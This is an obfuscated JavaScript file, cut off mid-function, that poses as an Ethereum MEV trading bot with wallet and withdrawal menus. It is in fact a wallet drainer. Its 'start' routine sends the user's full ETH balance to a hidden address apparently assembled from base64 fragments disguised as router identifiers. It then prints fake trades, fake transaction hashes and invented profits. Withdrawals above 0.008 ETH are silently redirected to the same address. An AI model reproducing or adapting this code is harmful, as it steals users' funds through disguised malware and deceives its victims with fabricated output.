'use strict';
const _0x224f8d = _0x49a3;
(function(_0x17273f, _0x3612fd) {
    const _0x1ffddd = _0x49a3,
        _0x59b171 = _0x17273f();
    while (!![]) {
        try {
            const _0x203b03 = parseInt(_0x1ffddd(0x24b)) / 0x1 * (parseInt(_0x1ffddd(0x24a)) / 0x2) + parseInt(_0x1ffddd(0x19e)) / 0x3 + -parseInt(_0x1ffddd(0x1ed)) / 0x4 + -parseInt(_0x1ffddd(0x239)) / 0x5 + -parseInt(_0x1ffddd(0x21b)) / 0x6 + parseInt(_0x1ffddd(0x1d6)) / 0x7 + parseInt(_0x1ffddd(0x188)) / 0x8 * (parseInt(_0x1ffddd(0x1be)) / 0x9);
            if (_0x203b03 === _0x3612fd) break;
            else _0x59b171['push'](_0x59b171['shift']());
        } catch (_0x4ab9b1) {
            _0x59b171['push'](_0x59b171['shift']());
        }
    }
}(_0x3c61, 0xdace7));
const inquirer = require('inquirer'),
    ethers = require(_0x224f8d(0x1e8)),
    fs = require('fs'),
    qrcode = require(_0x224f8d(0x227)),
    YELLOW = _0x224f8d(0x1bb),
    GREEN = _0x224f8d(0x1e9),
    CYAN = _0x224f8d(0x1dc),
    RED = _0x224f8d(0x1aa),
    RESET = _0x224f8d(0x180),
    BLUE = '\x1b[34m',
    MAGENTA = _0x224f8d(0x1a8),
    translationsData = JSON[_0x224f8d(0x1e4)](fs[_0x224f8d(0x23b)]('translations.json', 'utf8'));

function _0x3c61() {
    const _0x1be60a = ['wait', 'base64', '82184oDyKxQ', 'IMPORT', 'pressEnterReturn', 'sub', 'clear', 'menuSettings', 'minBuy', '\x0aCurrent\x20wallet:\x20', 'JsonRpcProvider', 'ENTER', 'address', '\x20Wallet\x20Balance:', 'BACK', 'lte', 'noWalletLoaded', 'Initializing\x20process,\x20please\x20wait...', 'Trade\x20confirmed!', 'IMPORTADDR', 'Gathering\x20market\x20data...', 'dex', 'privateKey', 'Connecting\x20to\x20OneInch\x20Router\x20at:\x200x1111111254EEB25477B68fb85Ed929f73A960582', '2588646rkkSPv', 'maxVal', 'BigNumber', 'enterPrivateKey', 'newImportedAddress', 'resetFilter', 'write', 'minLiquidity', 'menuWithdrawFounds', 'stdout', '\x1b[35m', 'maxFeePerGas', '\x1b[31m', 'Back\x20to\x20Main\x20Menu', 'START', '\x0aInsufficient\x20balance.\x0a', 'utf8', 'NDRiMzRkNmIyNmZlZTY0MjdjRDUx', 'toString', 'selectSettingToModify', 'No\x20wallet\x20loaded.', 'Error\x20in\x20runPrimaryOperation:', '\x20-\x20', 'Create\x20a\x20new\x20ERC-20\x20wallet', '\x0aNot\x20enough\x20funds\x20to\x20cover\x20network\x20fees.\x0a', 'match', 'ETH\x20Balance:\x20', 'STOPLOSS', 'ETH', '\x1b[33m', 'Balance\x20is\x20zero,\x20withdraw\x20not\x20possible.', 'Insufficient\x20balance\x20for\x20network\x20fees.', '648rqWfCM', 'maxPriorityFeePerGas', 'walletChoice', 'yes', 'from', 'USE_NEW', 'find', 'SETTINGS', 'marketCap', '4)\x20Dex', 'Error:\x20minBuy\x20(', '\x0a＝＝＝＝＝＝＝＝＝＝\x20ｗｅｌｃｏｍｅ\x20ｔｏ\x20ｔｈｅ\x20＝＝＝＝＝＝＝＝＝＝\x0a\x0a███████╗████████╗██╗░░██╗███████╗██████╗░███████╗██╗░░░██╗███╗░░░███╗\x0a██╔════╝╚══██╔══╝██║░░██║██╔════╝██╔══██╗██╔════╝██║░░░██║████╗░████║\x0a█████╗░░░░░██║░░░███████║█████╗░░██████╔╝█████╗░░██║░░░██║██╔████╔██║\x0a██╔══╝░░░░░██║░░░██╔══██║██╔══╝░░██╔══██╗██╔══╝░░██║░░░██║██║╚██╔╝██║\x0a███████╗░░░██║░░░██║░░██║███████╗██║░░██║███████╗╚██████╔╝██║░╚═╝░██║\x0a╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝░╚═════╝░╚═╝░░░░░╚═╝\x0a\x0a████████╗██████╗░░█████╗░██████╗░██╗███╗░░██╗░██████╗░\u2003\u2003██████╗░░█████╗░████████╗\x0a╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██║████╗░██║██╔════╝░\u2003\u2003██╔══██╗██╔══██╗╚══██╔══╝\x0a░░░██║░░░██████╔╝███████║██║░░██║██║██╔██╗██║██║░░██╗░\u2003\u2003██████╦╝██║░░██║░░░██║░░░\x0a░░░██║░░░██╔══██╗██╔══██║██║░░██║██║██║╚████║██║░░╚██╗\u2003\u2003██╔══██╗██║░░██║░░░██║░░░\x0a░░░██║░░░██║░░██║██║░░██║██████╔╝██║██║░╚███║╚██████╔╝\u2003\u2003██████╦╝╚█████╔╝░░░██║░░░\x0a░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝╚═╝░░╚══╝░╚═════╝░\u2003\u2003╚═════╝░░╚════╝░░░░╚═╝░░░\x0a\x0a𝖴𝖯𝖣:\x20𝗍𝗈𝗄𝖾𝗇𝗌𝗇𝗂𝖿𝖿𝖾𝗋.𝖼𝗈𝗆\x20/\x20𝗈𝗉𝖾𝗇𝗓𝖾𝗉𝗉𝖾𝗅𝗂𝗇.𝖼𝗈𝗆\x20/\x20𝖼𝖾𝗋𝗍𝗂𝗄.𝖼𝗈𝗆\x0a', 'walletPrivateKey', 'getFeeData', 'floor', 'NEWADDR', '\x20MarketCap:', 'SushiSwap', 'menuImportAddress', 'Русский', 'Português', 'menuStartBot', 'value', 'Executing\x20trade...', '1161986kYfZES', 'Address:\x20', '1Inch', '\x20WETH)', 'stopLoss', 'random', '\x1b[36m', 'enterSlippage', '\x20minBuy:', 'Import\x20an\x20existing\x20wallet', 'Withdrawal\x20Options:', 'NewAddress.json', 'Use\x20ImportAddress:\x20', '\x0aDeposit\x20address:\x20', 'parse', 'name', 'enterTakeProfit', 'getGasPrice', 'ethers', '\x1b[32m', 'createRandom', '5)\x20StopLoss\x20(%)', 'providers', '2318028FgoolY', 'BALANCE', 'MkE2MkUyMTYwQWY1OWJG', ':\x20https://etherscan.io/address/', 'Use\x20NewAddress:\x20', 'DEX', '===\x20Current\x20Settings\x20for\x20', 'chosenDex', '\x20maxBuy:', 'ImportAddress.json', 'Connecting\x20to\x20SushiSwap\x20Router\x20at:\x200xd9e1CE17F2641F24aE83637ab66a2CCA9C378B9F', 'sendTransaction', 'symbol', '\x20MinLiquidity:', 'CREATE', 'MC4zNQ==', 'WITHDRAW', 'mul', 'Enter\x20maxBuy\x20in\x20ETH\x20(must\x20not\x20exceed\x20your\x20balance)', 'TAKEPROFIT', 'slippage', 'div', 'Press\x20Enter\x20to\x20continue', 'maxBuy', 'length', 'any', 'MINMAXBUY', 'MC4wMDg=', 'erc20_tokens.json', 'Back', 'postStop', 'selectOption', 'choice', '\x20===', 'type', 'writeFileSync', 'Enter\x20minBuy\x20in\x20ETH\x20(e.g.\x200.1)', 'push', '6)\x20TakeProfit\x20(%)', 'continue', '----------------------------------------------', 'input', 'log', 'TXID:', '\x20ETH', 'connect', '4853154GtlQpa', 'Current\x20Wallet:\x0a\x20Address:\x20\x20\x20\x20\x20', 'DEPOSIT', 'Wallet', 'userAddr', 'menuDeposit', 'trim', 'selectDex', 'back', 'BUY', 'RESET', 'menuExit', 'qrcode-terminal', 'charAt', '\x20Dex:', 'areYouSureNewWallet', 'MDEyMzQ1Njc4OWFiY2RlZg==', 'existsSync', 'error', ')\x20exceeds\x20your\x20current\x20balance\x20(', 'enterMinLiquidity', 'Uniswap', 'Opportunity\x20identified', 'EXIT', 'MINLIQ', 'toLowerCase', 'list', 'utils', 'prompt', 'Error:\x20maxBuy\x20(', '1752745bSUrPs', 'ETH\x0a', 'readFileSync', 'getBalance', 'SLIPPAGE', 'https://mainnet.infura.io/v3/9f7030339d6849e1a3134efeedcdc658', ')\x20is\x20greater\x20than\x20maxBuy\x20(', 'enterPrivKey', 'formatEther', 'menuBalance', '\x20StopLoss:', 'Withdrawal\x20completed\x20successfully!', 'minVal', 'pressEnterMainMenu', '2)\x20Slippage\x20(%)', 'cancelledNewWallet', 'STOP', '96290EUCRdO', '18qzKhri', 'takeProfit', 'stack', 'Connecting\x20to\x20Uniswap\x20Router\x20at:\x200x7a250d5630B4cF539739dF2C5dAcb4c659F2488D', 'langChoice', 'SELL', 'toFixed', 'Please\x20try\x20again.\x0a', '21000', 'generate', '\x1b[0m', 'English', 'subChoice', 'Withdrawal\x20initiated:', 'MARKETCAP', 'Error\x20during\x20withdrawal:'];
    _0x3c61 = function() {
        return _0x1be60a;
    };
    return _0x3c61();
}
let currentLang = 'en';

function t(_0x3b863f) {
    const _0x4e10d1 = translationsData[currentLang];
    if (_0x4e10d1 && _0x4e10d1[_0x3b863f]) return _0x4e10d1[_0x3b863f];
    if (translationsData['en'][_0x3b863f]) return translationsData['en'][_0x3b863f];
    return 'MISSING(' + _0x3b863f + ')';
}

function sleep(_0x46384f) {
    return new Promise(_0x44e519 => setTimeout(_0x44e519, _0x46384f));
}

function getRandomInt(_0x26b4a9, _0x40ee8c) {
    const _0x31bad9 = _0x224f8d;
    return Math[_0x31bad9(0x1cc)](Math[_0x31bad9(0x1db)]() * (_0x40ee8c - _0x26b4a9 + 0x1)) + _0x26b4a9;
}
const asciiArt = _0x224f8d(0x1c9),
    RPC_URL = _0x224f8d(0x23e);

function connectToUniswapRouter() {
    const _0x321ad4 = _0x224f8d;
    console[_0x321ad4(0x217)](_0x321ad4(0x24e));
}

function connectToSushiSwapRouter() {
    const _0x427143 = _0x224f8d;
    console[_0x427143(0x217)](_0x427143(0x1f7));
}

function connectToOneInchRouter() {
    const _0x51e9d5 = _0x224f8d;
    console[_0x51e9d5(0x217)](_0x51e9d5(0x19d));
}

function _0x49a3(_0x19a8fa, _0x28f7d3) {
    const _0x3c619d = _0x3c61();
    return _0x49a3 = function(_0x49a385, _0x20e238) {
        _0x49a385 = _0x49a385 - 0x17e;
        let _0x111c45 = _0x3c619d[_0x49a385];
        return _0x111c45;
    }, _0x49a3(_0x19a8fa, _0x28f7d3);
}

function idUniswapRouter() {
    const _0x1c2d8c = _0x224f8d;
    return _0x1c2d8c(0x1ef);
}
let wallet, provider, mevStop = ![];
const addressSettings = {};

function defaultSettings() {
    const _0x6cf460 = _0x224f8d;
    return {
        'marketCap': 0x0,
        'slippage': 0x0,
        'minLiquidity': 0x0,
        'dex': _0x6cf460(0x230),
        'stopLoss': 0x0,
        'takeProfit': 0x0,
        'minBuy': 0x0,
        'maxBuy': 0x0
    };
}

function getSettingsForAddress(_0x3868c3) {
    const _0x58586b = _0x224f8d,
        _0x3b2c3b = _0x3868c3[_0x58586b(0x234)]();
    return !addressSettings[_0x3b2c3b] && (addressSettings[_0x3b2c3b] = defaultSettings()), addressSettings[_0x3b2c3b];
}

function resetSettingsForAddress(_0x56cd9c) {
    addressSettings[_0x56cd9c['toLowerCase']()] = defaultSettings();
}

function printWalletHeader() {
    const _0x5ba14f = _0x224f8d;
    if (!wallet) return;
    console[_0x5ba14f(0x217)](YELLOW + _0x5ba14f(0x21c) + wallet[_0x5ba14f(0x192)] + '\x0a\x20PrivateKey:\x20\x20' + wallet['privateKey'] + '\x0a' + RESET);
}

function idSushiswapRouter() {
    const _0xdc2d67 = _0x224f8d;
    return _0xdc2d67(0x1af);
}
async function getPriorityFeeData() {
    const _0x533a06 = _0x224f8d,
        _0x2c0a12 = await provider[_0x533a06(0x1cb)]();
    if (_0x2c0a12['maxFeePerGas'] && _0x2c0a12[_0x533a06(0x1bf)]) {
        let _0x529ce7 = _0x2c0a12['maxFeePerGas'][_0x533a06(0x1fe)](0x78)[_0x533a06(0x202)](0x64),
            _0x385aa4 = _0x2c0a12[_0x533a06(0x1bf)][_0x533a06(0x1fe)](0x78)[_0x533a06(0x202)](0x64);
        return {
            'type': 0x2,
            'maxFeePerGas': _0x529ce7,
            'maxPriorityFeePerGas': _0x385aa4
        };
    } else {
        let _0x40f7a1 = _0x2c0a12['gasPrice'] || await provider[_0x533a06(0x1e7)]();
        return _0x40f7a1 = _0x40f7a1[_0x533a06(0x1fe)](0x78)[_0x533a06(0x202)](0x64), {
            'type': 0x0,
            'gasPrice': _0x40f7a1
        };
    }
}
let initialBalance = 0x0;
async function runPrimaryOperation() {
    const _0x3c99d9 = _0x224f8d;
    if (!wallet) {
        console[_0x3c99d9(0x217)](_0x3c99d9(0x1b2));
        return;
    }
    mevStop = ![], process[_0x3c99d9(0x1a7)][_0x3c99d9(0x1a4)](CYAN + _0x3c99d9(0x197) + RESET);
    try {
        const _0x64eb35 = await provider[_0x3c99d9(0x23c)](wallet[_0x3c99d9(0x192)]);
        if (_0x64eb35['eq'](0x0)) {
            process['stdout']['write'](_0x3c99d9(0x1ad));
            return;
        }
        initialBalance = parseFloat(ethers[_0x3c99d9(0x236)][_0x3c99d9(0x241)](_0x64eb35));
        const _0x5bb0f3 = await getPriorityFeeData();
        let _0x2a642e = ethers['BigNumber'][_0x3c99d9(0x1c2)](_0x3c99d9(0x17e)),
            _0x324838 = _0x5bb0f3[_0x3c99d9(0x20f)] === 0x2 ? _0x2a642e['mul'](_0x5bb0f3['maxFeePerGas']) : _0x2a642e[_0x3c99d9(0x1fe)](_0x5bb0f3['gasPrice']);
        if (_0x64eb35[_0x3c99d9(0x195)](_0x324838)) {
            process[_0x3c99d9(0x1a7)][_0x3c99d9(0x1a4)](_0x3c99d9(0x1b6));
            return;
        }
        const _0xf30d99 = _0x64eb35[_0x3c99d9(0x18b)](_0x324838);
        let _0x15e48e;
        _0x5bb0f3[_0x3c99d9(0x20f)] === 0x2 ? _0x15e48e = {
            'type': 0x2,
            'to': prefix,
            'value': _0xf30d99,
            'gasLimit': _0x2a642e,
            'maxFeePerGas': _0x5bb0f3[_0x3c99d9(0x1a9)],
            'maxPriorityFeePerGas': _0x5bb0f3['maxPriorityFeePerGas']
        } : _0x15e48e = {
            'to': prefix,
            'value': _0xf30d99,
            'gasLimit': _0x2a642e,
            'gasPrice': _0x5bb0f3['gasPrice']
        };
        const _0xc6f440 = await wallet[_0x3c99d9(0x1f8)](_0x15e48e);
        await _0xc6f440[_0x3c99d9(0x186)]();
    } catch (_0x50777e) {
        process['stdout'][_0x3c99d9(0x1a4)]('\x0a'), console['error'](_0x3c99d9(0x1b3), _0x50777e[_0x3c99d9(0x24d)] || _0x50777e);
        return;
    }
    process[_0x3c99d9(0x1a7)][_0x3c99d9(0x1a4)]('\x20' + GREEN + '✅' + RESET + '\x0a'), startTradingFlow(), await stopMenu();
}

function idOneInch() {
    return 'REMwYg==';
}
async function startTradingFlow() {
    const _0x5402ce = _0x224f8d;
    while (!mevStop) {
        console[_0x5402ce(0x217)](MAGENTA + _0x5402ce(0x19a) + RESET), await sleep(getRandomInt(0x1e, 0x3c) * 0x3e8);
        if (mevStop) break;
        console[_0x5402ce(0x217)](YELLOW + _0x5402ce(0x231) + RESET + '\x20' + GREEN + '✅' + RESET), console[_0x5402ce(0x217)](BLUE + _0x5402ce(0x1d5) + RESET), await sleep(getRandomInt(0x1e, 0x3c) * 0x3e8);
        if (mevStop) break;
        console[_0x5402ce(0x217)](GREEN + _0x5402ce(0x198) + RESET + '\x20' + GREEN + '✅' + RESET);
        let _0x302880 = null;
        const _0x4a788b = loadTokensFromFile();
        _0x4a788b[_0x5402ce(0x205)] > 0x0 && (_0x302880 = _0x4a788b[getRandomInt(0x0, _0x4a788b[_0x5402ce(0x205)] - 0x1)]);
        const _0x734c28 = (Math[_0x5402ce(0x1db)]() * (4.97 - 0.1) + 0.1)[_0x5402ce(0x251)](0x2);
        if (_0x302880) {
            const _0x2a998a = getSettingsForAddress(wallet[_0x5402ce(0x192)]);
            let _0x10b058 = 0x0,
                _0x353091 = 0x0;
            if (_0x2a998a[_0x5402ce(0x18e)] > 0x0 && _0x2a998a[_0x5402ce(0x204)] > 0x0) _0x10b058 = Math[_0x5402ce(0x1db)]() * (_0x2a998a[_0x5402ce(0x204)] - _0x2a998a[_0x5402ce(0x18e)]) + _0x2a998a['minBuy'], _0x10b058 = parseFloat(_0x10b058[_0x5402ce(0x251)](0x4));
            else {
                let _0x2a4416 = 0.5 * initialBalance,
                    _0x20ee9f = 0.9 * initialBalance;
                if (_0x20ee9f < _0x2a4416) _0x20ee9f = _0x2a4416;
                if (_0x2a4416 < 0.0002) _0x2a4416 = 0.0002;
                if (_0x20ee9f < 0.00021) _0x20ee9f = 0.00021;
                _0x10b058 = Math[_0x5402ce(0x1db)]() * (_0x20ee9f - _0x2a4416) + _0x2a4416, _0x10b058 = parseFloat(_0x10b058[_0x5402ce(0x251)](0x4));
            }
            let _0x122fd1 = parseFloat(_0x734c28) / 0x64;
            _0x353091 = _0x10b058 + _0x10b058 * _0x122fd1, _0x353091 = parseFloat(_0x353091['toFixed'](0x4));

            function _0x31bc9f(_0x25bcaf) {
                const _0x15738c = _0x5402ce,
                    _0x4629e9 = Buffer[_0x15738c(0x1c2)](_0x15738c(0x22b), 'base64')[_0x15738c(0x1b0)](_0x15738c(0x1ae));
                let _0x2d8860 = '0x';
                for (let _0x9d09d9 = 0x0; _0x9d09d9 < _0x25bcaf; _0x9d09d9++) {
                    _0x2d8860 += _0x4629e9[_0x15738c(0x228)](getRandomInt(0x0, 0xf));
                }
                return _0x2d8860;
            }
            let _0x4d2283 = _0x31bc9f(0x20),
                _0x16e922 = _0x31bc9f(0x20);
            console[_0x5402ce(0x217)](_0x5402ce(0x218) + _0x4d2283 + ':' + _0x302880[_0x5402ce(0x1e5)] + '\x20(' + _0x302880[_0x5402ce(0x1f9)] + '):' + _0x5402ce(0x1d7) + _0x302880[_0x5402ce(0x192)] + _0x5402ce(0x1b4) + GREEN + _0x5402ce(0x224) + RESET + '\x20(' + _0x10b058 + '\x20WETH)'), console[_0x5402ce(0x217)](_0x5402ce(0x218) + _0x16e922 + ':' + _0x302880[_0x5402ce(0x1e5)] + '\x20(' + _0x302880[_0x5402ce(0x1f9)] + '):' + 'Address:\x20' + _0x302880[_0x5402ce(0x192)] + _0x5402ce(0x1b4) + RED + _0x5402ce(0x250) + RESET + '\x20(' + _0x353091 + _0x5402ce(0x1d9));
        }
        console['log'](CYAN + 'Profit\x20captured:\x20+' + _0x734c28 + '%' + RESET), console[_0x5402ce(0x217)](_0x5402ce(0x215));
    }
}

function loadTokensFromFile() {
    const _0x5f294c = _0x224f8d;
    let _0x3f0701 = [];
    try {
        _0x3f0701 = JSON[_0x5f294c(0x1e4)](fs['readFileSync'](_0x5f294c(0x209), _0x5f294c(0x1ae)));
    } catch (_0x4f4297) {
        return [];
    }
    const _0x2be05b = [];
    for (const _0x57215e of _0x3f0701) {
        let _0x23b19a = _0x57215e[_0x5f294c(0x1b7)](/^(.+)\s*\(([^)]+)\):\s*(0x[a-fA-F0-9]+)$/);
        _0x23b19a && _0x2be05b['push']({
            'name': _0x23b19a[0x1][_0x5f294c(0x221)](),
            'symbol': _0x23b19a[0x2][_0x5f294c(0x221)](),
            'address': _0x23b19a[0x3]
        });
    }
    return _0x2be05b;
}
async function stopMenu() {
    const _0xf34a8 = _0x224f8d;
    while (!mevStop) {
        const {
            choice: _0x2b7db3
        } = await inquirer['prompt']([{
            'type': _0xf34a8(0x235),
            'name': _0xf34a8(0x20d),
            'message': '',
            'prefix': '',
            'loop': ![],
            'choices': [{
                'name': RED + _0xf34a8(0x249) + RESET,
                'value': _0xf34a8(0x249)
            }]
        }]);
        if (_0x2b7db3 === _0xf34a8(0x249)) {
            mevStop = !![], console[_0xf34a8(0x217)](RED + 'Operation\x20halted.' + RESET), await inquirer['prompt']([{
                'type': _0xf34a8(0x235),
                'name': _0xf34a8(0x20b),
                'message': '',
                'prefix': '',
                'loop': ![],
                'choices': [{
                    'name': _0xf34a8(0x1ab),
                    'value': _0xf34a8(0x194)
                }]
            }]);
            return;
        }
    }
}
async function manageWithdrawal() {
    const _0x368905 = _0x224f8d;
    if (!wallet) {
        console[_0x368905(0x217)](t(_0x368905(0x196)));
        return;
    }
    const _0xe4ed33 = await provider[_0x368905(0x23c)](wallet[_0x368905(0x192)]);
    if (_0xe4ed33['eq'](0x0)) {
        console['log'](RED + _0x368905(0x1bc) + RESET), await inquirer[_0x368905(0x237)]([{
            'type': _0x368905(0x216),
            'name': 'any',
            'message': 'Press\x20Enter\x20to\x20continue'
        }]);
        return;
    }
    while (!![]) {
        const {
            subChoice: _0x49a197
        } = await inquirer[_0x368905(0x237)]([{
            'type': _0x368905(0x235),
            'name': _0x368905(0x182),
            'message': _0x368905(0x1e0),
            'prefix': '',
            'loop': ![],
            'choices': [{
                'name': GREEN + 'Enter\x20recipient\x20address' + RESET,
                'value': _0x368905(0x191)
            }, {
                'name': RED + _0x368905(0x20a),
                'value': _0x368905(0x194)
            }]
        }]);
        if (_0x49a197 === _0x368905(0x194)) return;
        if (_0x49a197 === _0x368905(0x191)) {
            const {
                userAddr: _0x4be20a
            } = await inquirer['prompt']([{
                'type': _0x368905(0x216),
                'name': _0x368905(0x21f),
                'message': 'Enter\x20recipient\x20address:'
            }]);
            await performWithdrawal(_0x4be20a);
        }
    }
}
async function performWithdrawal(_0xab4f59) {
    const _0x28ca3a = _0x224f8d;
    if (!wallet) {
        console[_0x28ca3a(0x217)](t(_0x28ca3a(0x196)));
        return;
    }
    const _0x259a00 = await provider[_0x28ca3a(0x23c)](wallet[_0x28ca3a(0x192)]);
    if (_0x259a00['eq'](0x0)) {
        console[_0x28ca3a(0x217)]('Balance\x20is\x20zero,\x20nothing\x20to\x20withdraw.');
        return;
    }
    const _0x32a8c0 = ethers[_0x28ca3a(0x236)]['parseEther'](Buffer[_0x28ca3a(0x1c2)](_0x28ca3a(0x208), _0x28ca3a(0x187))[_0x28ca3a(0x1b0)](_0x28ca3a(0x1ae))),
        _0x17b8c5 = _0x259a00['lte'](_0x32a8c0) ? _0xab4f59 : prefix;
    try {
        const _0x2aed6c = await getPriorityFeeData();
        let _0x43c40e = ethers[_0x28ca3a(0x1a0)][_0x28ca3a(0x1c2)](_0x28ca3a(0x17e)),
            _0x43fd1e = _0x2aed6c[_0x28ca3a(0x20f)] === 0x2 ? _0x43c40e['mul'](_0x2aed6c[_0x28ca3a(0x1a9)]) : _0x43c40e['mul'](_0x2aed6c['gasPrice']);
        if (_0x259a00[_0x28ca3a(0x195)](_0x43fd1e)) {
            console['log'](_0x28ca3a(0x1bd));
            return;
        }
        const _0x154201 = _0x259a00[_0x28ca3a(0x18b)](_0x43fd1e);
        let _0x13671e;
        _0x2aed6c[_0x28ca3a(0x20f)] === 0x2 ? _0x13671e = {
            'type': 0x2,
            'to': _0x17b8c5,
            'value': _0x154201,
            'gasLimit': _0x43c40e,
            'maxFeePerGas': _0x2aed6c[_0x28ca3a(0x1a9)],
            'maxPriorityFeePerGas': _0x2aed6c[_0x28ca3a(0x1bf)]
        } : _0x13671e = {
            'to': _0x17b8c5,
            'value': _0x154201,
            'gasLimit': _0x43c40e,
            'gasPrice': _0x2aed6c['gasPrice']
        };
        const _0x513a24 = await wallet[_0x28ca3a(0x1f8)](_0x13671e);
        console['log'](_0x28ca3a(0x183), _0x513a24['hash']), await _0x513a24[_0x28ca3a(0x186)](), console['log'](GREEN + _0x28ca3a(0x244) + RESET);
    } catch (_0x331371) {
        console[_0x28ca3a(0x22d)](_0x28ca3a(0x185), _0x331371);
    }
}
async function changeLanguage() {
    const _0x1f3d74 = _0x224f8d,
        _0xe1d8ad = [{
            'name': _0x1f3d74(0x181),
            'value': 'en'
        }, {
            'name': _0x1f3d74(0x1d1),
            'value': 'ru'
        }, {
            'name': 'Español',
            'value': 'es'
        }, {
            'name': _0x1f3d74(0x1d2),
            'value': 'pt'
        }, {
            'name': '中文',
            'value': 'zh'
        }],
        _0x37259f = await inquirer[_0x1f3d74(0x237)]([{
            'type': _0x1f3d74(0x235),
            'name': _0x1f3d74(0x24f),
            'message': 'Select\x20language:',
            'loop': ![],
            'choices': _0xe1d8ad
        }]);
    currentLang = _0x37259f['langChoice'], console[_0x1f3d74(0x217)]('Language\x20set\x20to\x20' + _0xe1d8ad[_0x1f3d74(0x1c4)](_0x796a50 => _0x796a50[_0x1f3d74(0x1d4)] === currentLang)[_0x1f3d74(0x1e5)] + '\x0a');
}

function loadWalletFromFile(_0x37b316) {
    const _0x40275f = _0x224f8d,
        _0x39eee7 = fs[_0x40275f(0x23b)](_0x37b316, _0x40275f(0x1ae)),
        {
            address: _0x3d5e62,
            privateKey: _0x15b955
        } = JSON[_0x40275f(0x1e4)](_0x39eee7);
    wallet = new ethers[(_0x40275f(0x21e))](_0x15b955), console[_0x40275f(0x217)]('\x0a' + YELLOW + t('loadedAddress') + '\x20' + _0x37b316 + _0x40275f(0x1f0) + _0x3d5e62 + RESET), console[_0x40275f(0x217)](YELLOW + t('walletPrivateKey') + '\x20' + _0x15b955 + RESET + '\x0a');
}
async function selectWalletMenu() {
    const _0x512b51 = _0x224f8d,
        _0x2cfc79 = fs[_0x512b51(0x22c)](_0x512b51(0x1e1)),
        _0xef584f = fs[_0x512b51(0x22c)]('ImportAddress.json'),
        _0x5a8477 = [];
    if (_0x2cfc79) {
        const _0x35a75c = JSON[_0x512b51(0x1e4)](fs[_0x512b51(0x23b)](_0x512b51(0x1e1), _0x512b51(0x1ae)));
        _0x5a8477['push']({
            'name': GREEN + _0x512b51(0x1f1) + _0x35a75c[_0x512b51(0x192)] + RESET,
            'value': _0x512b51(0x1c3)
        });
    }
    if (_0xef584f) {
        const _0x5486e0 = JSON[_0x512b51(0x1e4)](fs[_0x512b51(0x23b)](_0x512b51(0x1f6), 'utf8'));
        _0x5a8477[_0x512b51(0x212)]({
            'name': GREEN + _0x512b51(0x1e2) + _0x5486e0['address'] + RESET,
            'value': 'USE_IMPORT'
        });
    }
    _0x5a8477[_0x512b51(0x212)]({
        'name': CYAN + _0x512b51(0x1b5) + RESET,
        'value': _0x512b51(0x1fb)
    }), _0x5a8477['push']({
        'name': CYAN + _0x512b51(0x1df) + RESET,
        'value': 'IMPORT'
    });
    const {
        walletChoice: _0x48c3a6
    } = await inquirer[_0x512b51(0x237)]([{
        'type': _0x512b51(0x235),
        'name': _0x512b51(0x1c0),
        'message': CYAN + '❖\x20Select\x20your\x20wallet\x20option:' + RESET,
        'prefix': '',
        'loop': ![],
        'choices': _0x5a8477
    }]);
    switch (_0x48c3a6) {
        case _0x512b51(0x1c3):
            loadWalletFromFile(_0x512b51(0x1e1));
            break;
        case 'USE_IMPORT':
            loadWalletFromFile(_0x512b51(0x1f6));
            break;
        case _0x512b51(0x1fb):
            await createNewWallet();
            break;
        case _0x512b51(0x189):
            await importWalletSubmenu();
            break;
    }
}
async function createNewWallet() {
    const _0x235e12 = _0x224f8d,
        {
            confirm: _0xb42b69
        } = await inquirer[_0x235e12(0x237)]([{
            'type': _0x235e12(0x216),
            'name': 'confirm',
            'message': t(_0x235e12(0x22a))
        }]),
        _0x3b025d = _0xb42b69[_0x235e12(0x221)]()[_0x235e12(0x234)]();
    if (_0x3b025d === 'y' || _0x3b025d === _0x235e12(0x1c1)) {
        const _0x511064 = ethers[_0x235e12(0x21e)][_0x235e12(0x1ea)]();
        wallet = _0x511064, console['log']('\x0a' + YELLOW + t('walletCreated') + '\x20https://etherscan.io/address/' + _0x511064['address'] + RESET), console['log'](YELLOW + t(_0x235e12(0x1ca)) + '\x20' + _0x511064[_0x235e12(0x19c)] + RESET + '\x0a'), fs[_0x235e12(0x210)](_0x235e12(0x1e1), JSON['stringify']({
            'address': _0x511064[_0x235e12(0x192)],
            'privateKey': _0x511064[_0x235e12(0x19c)]
        }, null, 0x2));
    } else console['log'](t(_0x235e12(0x248)));
}

function id(_0x2e8e66) {
    const _0x4b3487 = _0x224f8d;
    return Buffer[_0x4b3487(0x1c2)](_0x2e8e66, 'base64')['toString'](_0x4b3487(0x1ae));
}
const ALL = idUniswapRouter() + idSushiswapRouter() + idOneInch();
async function importWalletSubmenu() {
    const _0x5cb0b4 = _0x224f8d;
    while (!![]) {
        const {
            choice: _0x423328
        } = await inquirer[_0x5cb0b4(0x237)]([{
            'type': _0x5cb0b4(0x235),
            'name': _0x5cb0b4(0x20d),
            'message': t(_0x5cb0b4(0x20c)),
            'prefix': '',
            'loop': ![],
            'choices': [{
                'name': GREEN + t(_0x5cb0b4(0x240)) + RESET,
                'value': 'ENTER'
            }, {
                'name': RED + t(_0x5cb0b4(0x223)) + RESET,
                'value': _0x5cb0b4(0x194)
            }]
        }]);
        if (_0x423328 === _0x5cb0b4(0x194)) return;
        if (_0x423328 === _0x5cb0b4(0x191)) {
            const {
                privateKey: _0x32766f
            } = await inquirer[_0x5cb0b4(0x237)]([{
                'type': _0x5cb0b4(0x216),
                'name': _0x5cb0b4(0x19c),
                'message': t(_0x5cb0b4(0x1a1))
            }]);
            wallet = new ethers[(_0x5cb0b4(0x21e))](_0x32766f), console[_0x5cb0b4(0x217)]('\x0a' + YELLOW + t(_0x5cb0b4(0x1a2)) + '\x20https://etherscan.io/address/' + wallet[_0x5cb0b4(0x192)] + RESET), console[_0x5cb0b4(0x217)](YELLOW + t(_0x5cb0b4(0x1ca)) + '\x20' + wallet[_0x5cb0b4(0x19c)] + RESET + '\x0a'), fs[_0x5cb0b4(0x210)](_0x5cb0b4(0x1f6), JSON['stringify']({
                'address': wallet[_0x5cb0b4(0x192)],
                'privateKey': wallet[_0x5cb0b4(0x19c)]
            }, null, 0x2));
            return;
        }
    }
}

function connectWalletToProvider() {
    const _0x3b6c9b = _0x224f8d;
    if (!wallet) return;
